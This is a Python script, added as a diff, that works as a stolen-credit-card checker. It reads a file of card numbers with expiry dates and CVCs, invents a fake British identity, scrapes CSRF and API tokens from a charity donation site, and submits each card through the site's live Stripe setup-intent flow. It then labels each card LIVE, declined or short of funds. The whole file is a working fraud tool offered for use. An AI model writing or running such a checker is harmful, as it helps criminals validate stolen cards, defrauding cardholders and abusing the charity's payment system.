@@ -1,0 +1,195 @@
+import requests as r
+from fake_useragent import UserAgent
+from datetime import datetime
+from faker import Faker
+from urllib.parse import quote_plus
+import json
+import time
+import random
+import requests as r
+from bs4 import BeautifulSoup
+import json
+import html
+
+s = r.Session()
+fake = Faker('en_GB')
+first_name = fake.first_name()
+last_name = fake.last_name()
+address_1 = fake.street_address()
+city = fake.city()
+state = fake.random_element(elements=(
+    'London', 'Manchester', 'Yorkshire', 'Essex', 
+    'Kent', 'Lancashire', 'West Midlands', 'Glasgow',
+    'Edinburgh', 'Birmingham', 'Liverpool', 'Bristol',
+    'Sheffield', 'Leeds', 'Cardiff', 'Belfast',
+    'Nottingham', 'Leicester', 'Coventry', 'Hull',
+    'Newcastle', 'Brighton', 'Portsmouth', 'Southampton',
+    'Norfolk', 'Suffolk', 'Devon', 'Cornwall',
+    'Dorset', 'Somerset', 'Cheshire', 'Shropshire',
+    'Derbyshire', 'Nottinghamshire', 'Lincolnshire',
+    'Northumberland', 'Durham', 'Cumbria', 'North Yorkshire',
+    'West Yorkshire', 'South Yorkshire', 'Merseyside',
+    'Greater Manchester', 'West Midlands', 'Warwickshire',
+    'Staffordshire', 'Hertfordshire', 'Buckinghamshire',
+    'Oxfordshire', 'Gloucestershire', 'Cambridgeshire',
+    'Worcestershire', 'Herefordshire', 'Bedfordshire',
+    'Berkshire', 'Surrey', 'Sussex', 'Hampshire',
+    'Isle of Wight', 'Wiltshire', 'Northamptonshire',
+    'Rutland', 'Monmouthshire', 'Glamorgan', 'Gwent',
+    'Dyfed', 'Powys', 'Gwynedd', 'Clwyd',
+    'Strathclyde', 'Lothian', 'Grampian', 'Tayside',
+    'Fife', 'Central', 'Borders', 'Dumfries and Galloway',
+    'Highland', 'Islands', 'Antrim', 'Down',
+    'Armagh', 'Londonderry', 'Tyrone', 'Fermanagh'
+))
+postcode = fake.postcode()
+email = fake.email(domain='gmail.com')
+phone = fake.phone_number()
+name = f"{first_name}+{last_name}"
+email_encoded = quote_plus(email)
+session_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+ua = UserAgent()
+user_agent = ua.random
+
+billing_country = 'GB'
+billing_address_1 = quote_plus(address_1)
+billing_address_2 = ''
+billing_city = quote_plus(city)
+billing_state = quote_plus(state)
+billing_postcode = quote_plus(postcode)
+billing_phone = quote_plus(phone)
+
+
+file = input('dosya gir: ')
+
+file=open(f'{file}',"+r")
+start_num = 0
+for P in file.readlines():
+    start_num += 1
+    n = P.split('|')[0]
+    bin3=n[:6]
+    mm=P.split('|')[1]
+    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
+        mm = mm
+    elif '0' not in mm:
+        mm = f'0{mm}'
+    else:
+        mm = mm
+    yy=P.split('|')[2]
+    cvc=P.split('|')[3].replace('\n', '')
+    P=P.replace('\n', '')	
+    if "20" not in yy:
+        yy = f'20{yy}'
+    else:
+        yy = yy
+
+
+    headers = {
+    'authority': 'sdbfh.betterworld.org',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+}
+
+    response = s.get('https://sdbfh.betterworld.org/', headers=headers)
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    config_div = soup.find('div', id='_bw_config')
+    raw_data = html.unescape(config_div.text)
+    config_json = json.loads(raw_data)
+    csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
+    csrf_token = csrf_meta['content']
+    auth_token = config_json['api_keys']['bwc']
+
+    headers = {
+    'authority': 'api.betterworld.org',
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    'x-auth-token': auth_token,
+    'x-bw-src': 'l',
+    'x-csrf-token': csrf_token
+}
+
+    data = {
+    'first_name': first_name,
+    'last_name': last_name,
+    'email': email,
+    'payment_method_type': 'card',
+    'is_widget': '0',
+}
+
+    res1 = s.post('https://api.betterworld.org/v1/user-payments/setup-intents', cookies=s.cookies, headers=headers, data=data)
+
+
+    seti = (res1.json()['data']['stripe_setup_intent_id'])
+
+
+    client = (res1.json()['data']['stripe_setup_intent_client_secret'])
+
+
+
+    headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+}
+
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[address][line1]=Street+72838&billing_details[address][line2]=Apt&billing_details[address][city]=Hudson&billing_details[address][state]=NY&billing_details[name]=Spider+Man&billing_details[phone]=&payment_user_agent=stripe.js%2F5766238eed%3B+stripe-js-v3%2F5766238eed%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fsdbfh.betterworld.org&time_on_page=97274&client_attribution_metadata[client_session_id]=00715c43-ce48-45a8-9c86-2f5aca7d459b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe8047f8-7e48-40c8-9ad1-2a9ce07e715b&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=address&guid=06f7ab89-790e-4355-84b4-8ba5d036a3f6aa4625&muid=74bac138-02f3-4fd2-acff-68750288eb132930ce&sid=dbccc85f-27e3-4c2f-8376-7cca4baf3a7046d54b&key=pk_live_aGE2zfplg4kOqYZ4QWKOM9ah'
+
+    res2 = s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    pm = (res2.json()['id'])
+
+    headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+}
+
+    data = f'return_url=https%3A%2F%2Fsdbfh.betterworld.org%2Fdonate%3Fform_firstName%3DSpider%26form_lastName%3DMan%26form_email%3Dkskjdlsw%2540gmail.com%26form_amount%3D100%26form_dedication%3DKw%26form_wantsToCoverFees%3Dtrue%26form_shippingSameAsBilling%3Dtrue%26form_restore%3Dtrue&payment_method={pm}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_aGE2zfplg4kOqYZ4QWKOM9ah&client_attribution_metadata[client_session_id]=00715c43-ce48-45a8-9c86-2f5aca7d459b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe8047f8-7e48-40c8-9ad1-2a9ce07e715b&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=address&client_secret={client}'
+
+    res3 = s.post(
+    f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
+    headers=headers,
+    data=data,
+)
+    if "card_declined" in res3.text:
+        print(f'{P} >> card_declined')
+    elif "insufficient_funds" in res3.text:
+        print(f'{P} >> insufficient_funds')
+    elif "expired_card" in res3.text:
+        print(f'{P} >> expired_card')
+    elif "incorrect_cvc" in res3.text:
+        print(f'{P} >> incorrect_cvc')
+    elif '"status": "succeeded"' in res3.text:
+        print(f'{P} >> LİVE ✅')
+    elif "thank_you" in res3.text or "receipt" in res3.text:
+        print(f'{P} >> LIVE - CHARGED')
+    elif "incorrect_number" in res3.text:
+    	print(f'{P} >> incorrect_number')
+    elif "requires_action" in res3.text:
+    	print(f'{P} >> requires_action')
+    else:
+        print(f"response / {res3.text}")
